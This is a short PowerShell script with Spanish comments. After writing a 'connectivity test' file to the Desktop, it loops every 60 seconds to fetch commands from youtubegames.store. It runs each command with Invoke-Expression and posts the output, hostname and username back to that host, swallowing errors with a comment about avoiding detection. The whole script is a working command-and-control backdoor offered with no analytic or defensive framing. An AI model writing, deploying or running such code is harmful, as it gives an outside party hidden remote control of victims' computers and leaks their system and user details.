# Test de conectividad - Escribe un archivo para confirmar ejecución
"Se ejecutó correctamente el $(Get-Date)" | Out-File -FilePath "$env:USERPROFILE\Desktop\ejecucion_confirmada.txt" -Append

# Bucle de heartbeat cada 60 segundos
while ($true) {
    try {
        $response = Invoke-WebRequest -Uri "https://youtubegames.store/heartbeat" -UseBasicParsing -TimeoutSec 10
        $command = $response.Content.Trim()
        
        if ($command -and $command -ne "OK") {
            # Ejecuta comando recibido y envía resultado
            $result = Invoke-Expression $command 2>&1 | Out-String
            $body = @{result=$result; hostname=$env:COMPUTERNAME; user=$env:USERNAME} | ConvertTo-Json
            Invoke-WebRequest -Uri "https://youtubegames.store/report" -Method POST -Body $body -UseBasicParsing
        }
    } catch {
        # Silencio para evitar detección
    }
    Start-Sleep -Seconds 60
}
